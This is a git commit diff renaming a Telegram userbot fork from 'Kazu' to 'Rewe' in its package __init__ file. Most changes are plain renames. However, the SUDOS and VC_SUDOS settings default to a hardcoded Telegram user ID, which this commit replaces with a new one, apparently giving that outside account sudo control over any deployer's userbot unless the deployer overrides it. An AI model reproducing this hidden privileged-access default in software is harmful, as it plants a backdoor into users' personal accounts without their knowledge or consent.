1a45421b4e234115718cac6604fbfc3a00b498ed
rewe1501 <168255947+rewe1501@users.noreply.github.com>
2024-04-27 13:30:40 +0700

    Update __init__.py

--- Rewe/__init__.py
+++ Rewe/__init__.py
@@ -12,9 +12,9 @@ from .version import __version__
 
 run_as_module = False
 
-class KazuConfig:
+class ReweConfig:
     lang = "id"
-    thumb = "https://graph.org//file/d854abd533a783c6642b1.jpg"
+    thumb = "https://telegra.ph/file/8fc7931395f64ee29052c.jpg"
 
 if sys.argv[0] == "-m":
     run_as_module = True
@@ -23,11 +23,11 @@ if sys.argv[0] == "-m":
 
     from .configs import Var
     from .startup import *
-    from .startup._database import KazuDB
-    from .startup.BaseClient import KazuClient
+    from .startup._database import ReweDB
+    from .startup.BaseClient import ReweClient
     from .startup.connections import validate_session, vc_connection
     from .startup.funcs import _version_changes, autobot, enable_inline, update_envs
-    from .version import kazu_version
+    from .version import rewe_version
 
     if not os.path.exists("./plugins"):
         LOGS.error(
@@ -36,10 +36,10 @@ if sys.argv[0] == "-m":
         exit()
 
     start_time = time.time()
-    _kazu_cache = {}
+    _rewe_cache = {}
     _ignore_eval = []
 
-    udB = KazuDB()
+    udB = ReweDB()
     update_envs()
 
     LOGS.info(f"Connecting to {udB.name}...")
@@ -53,7 +53,7 @@ if sys.argv[0] == "-m":
         if DUAL_MODE:
             udB.del_key("DUAL_MODE")
             DUAL_MODE = False
-        kazu_bot = None
+        rewe_bot = None
 
         if not udB.get_key("BOT_TOKEN"):
             LOGS.critical(
@@ -62,42 +62,42 @@ if sys.argv[0] == "-m":
 
             sys.exit()
     else:
-        kazu_bot = KazuClient(
+        rewe_bot = ReweClient(
             validate_session(Var.SESSION, LOGS),
             udB=udB,
-            app_version=kazu_version,
-            device_model="Kazu",
+            app_version=rewe_version,
+            device_model="Rewe",
         )
-        kazu_bot.run_in_loop(autobot())
+        rewe_bot.run_in_loop(autobot())
 
-    asst = KazuClient(None, bot_token=udB.get_key("BOT_TOKEN"), udB=udB)
+    asst = ReweClient(None, bot_token=udB.get_key("BOT_TOKEN"), udB=udB)
 
     if BOT_MODE:
-        kazu_bot = asst
+        rewe_bot = asst
         if udB.get_key("OWNER_ID"):
             try:
-                kazu_bot.me = kazu_bot.run_in_loop(
-                    kazu_bot.get_entity(udB.get_key("OWNER_ID"))
+                rewe_bot.me = rewe_bot.run_in_loop(
+                    rewe_bot.get_entity(udB.get_key("OWNER_ID"))
                 )
             except Exception as er:
                 LOGS.exception(er)
     elif not asst.me.bot_inline_placeholder:
-        kazu_bot.run_in_loop(enable_inline(kazu_bot, asst.me.username))
+        rewe_bot.run_in_loop(enable_inline(rewe_bot, asst.me.username))
 
-    vcClient = vc_connection(udB, kazu_bot)
+    vcClient = vc_connection(udB, rewe_bot)
 
     _version_changes(udB)
 
     HNDLR = udB.get_key("HNDLR") or "."
-    SUDOS = udB.get_key("SUDOS") or "5063062493"
-    VC_SUDOS = udB.get_key("VC_SUDOS") or "5063062493"
+    SUDOS = udB.get_key("SUDOS") or "5569311686"
+    VC_SUDOS = udB.get_key("VC_SUDOS") or "5569311686"
     DUAL_HNDLR = udB.get_key("DUAL_HNDLR") or "/"
     SUDO_HNDLR = udB.get_key("SUDO_HNDLR") or "NO_HNDLR"
 else:
-    print("Kazu 2022 © Kazu-Ubot")
+    print("Rewe 2022 © Rewe-Ubot")
 
     from logging import getLogger
 
-    LOGS = getLogger("Kazu")
+    LOGS = getLogger("Rewe")
 
-    kazu_bot = asst = udB = vcClient = None
+    rewe_bot = asst = udB = vcClient = None
